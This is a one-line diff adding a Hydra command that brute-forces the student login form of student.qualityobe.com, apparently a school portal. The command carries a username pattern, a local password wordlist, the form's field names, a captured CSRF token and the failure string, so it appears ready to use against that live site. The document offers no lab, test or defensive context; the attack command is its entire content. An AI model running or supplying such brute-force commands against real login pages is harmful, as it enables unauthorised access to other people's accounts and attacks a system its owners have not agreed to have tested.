@@ -1,0 +1,1 @@
+hydra -l NUM-BSXX-XXXX-XX -P /home/maya/Pictures/cs.txt student.qualityobe.com https-post-form "/site/login:LoginFormStudent[username]=^USER^&LoginFormStudent[password]=^PASS^&LoginFormStudent[rememberMe]=1&_csrf-backend=b0IW9GyToPPd3HDjmZAEZY3B2ilesa7A3pngdGJSLdIICibNG9v_x7quM4XD1HcV74LjYTiG-4uU6dE-EWVcmQ==:F=invalid"
